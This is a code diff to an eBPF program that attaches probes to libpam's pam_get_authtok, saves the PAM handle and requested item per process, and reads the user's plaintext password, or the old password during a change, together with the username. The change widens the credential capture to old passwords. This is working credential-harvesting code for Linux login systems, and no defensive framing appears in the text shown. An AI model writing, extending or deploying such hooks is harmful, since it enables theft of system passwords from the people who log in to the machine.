@@ -12,7 +12,7 @@ char LICENSE[] SEC("license") = "Dual BSD/GPL";
  *  \brief  dump from source code of libpam
  *          This is a partial header
  */
-typedef struct pam_handle
+typedef struct pam_handle_s
 {
   char *authtok;
   unsigned caller_is;
@@ -29,6 +29,14 @@ typedef struct pam_handle
   void *data;
   void *env; /* structure to maintain environment list */
 } pam_handle_t;
+
+#define PAM_AUTHTOK 6
+#define PAM_OLDAUTHTOK 7
+
+struct pam_context_t {
+    pam_handle_t *pamh;
+    u64 item;
+};
 
 /******************************************************************************/
 /*!
@@ -47,7 +55,7 @@ struct
 struct {
     __uint(type       , BPF_MAP_TYPE_HASH);
     __uint(key_size   , sizeof(uint32_t));
-    __uint(value_size , sizeof(pam_handle_t*));
+    __uint(value_size , sizeof(struct pam_context_t));
     __uint(max_entries, 1024);
 } pam_handle_t_map SEC(".maps");
 
@@ -66,13 +74,15 @@ int get_addr_pam_get_authtok(struct pt_regs *ctx)
   if (!PT_REGS_PARM1(ctx))
     return 0;
 
-  pam_handle_t* phandle = (pam_handle_t*)PT_REGS_PARM1(ctx);
+  struct pam_context_t ctx_data = {};
+  ctx_data.pamh = (pam_handle_t*)PT_REGS_PARM1(ctx);
+  ctx_data.item = (u64)PT_REGS_PARM2(ctx);
 
   // Get current PID to track
   u32 pid = bpf_get_current_pid_tgid() >> 32;
 
   // Store pam_handle_t pointer in map for later use
-  bpf_map_update_elem(&pam_handle_t_map, &pid, &phandle, BPF_ANY);
+  bpf_map_update_elem(&pam_handle_t_map, &pid, &ctx_data, BPF_ANY);
 
   return 0;
 };
@@ -80,24 +90,36 @@ int get_addr_pam_get_authtok(struct pt_regs *ctx)
 SEC("uretprobe/pam_get_authtok")
 int trace_pam_get_authtok(struct pt_regs *ctx)
 {
-  pam_handle_t* phandle = 0;
+  pam_handle_t *phandle = 0;
+  u64 item = 0;
 
   // Get current PID to track
   u32 pid = bpf_get_current_pid_tgid() >> 32;
 
-  // Get pam_handle_t pointer from map
-  void *pam_handle_t_ptr = bpf_map_lookup_elem(&pam_handle_t_map, &pid);
-  if (!pam_handle_t_ptr)
+  // Get pam_context_t from map
+  struct pam_context_t *ctx_data = bpf_map_lookup_elem(&pam_handle_t_map, &pid);
+  if (!ctx_data)
     return 0;
 
-  bpf_probe_read(&phandle, sizeof(phandle), pam_handle_t_ptr);
+  phandle = ctx_data->pamh;
+  item = ctx_data->item;
 
   // Delete map entry after use
   if (bpf_map_delete_elem(&pam_handle_t_map, &pid)) return 0;
 
   // retrieve output parameter
   u64 password_addr = 0;
-  bpf_probe_read(&password_addr, sizeof(password_addr), &phandle->authtok);
+
+  if (item == PAM_AUTHTOK) {
+      if (phandle)
+          bpf_probe_read(&password_addr, sizeof(password_addr), &phandle->authtok);
+  } else if (item == PAM_OLDAUTHTOK) {
+      if (phandle)
+          bpf_probe_read(&password_addr, sizeof(password_addr), &phandle->oldauthtok);
+  } else {
+      // Ignore other items
+      return 0; 
+  }
 
   u64 username_addr = 0;
   bpf_probe_read(&username_addr, sizeof(username_addr), &phandle->user);
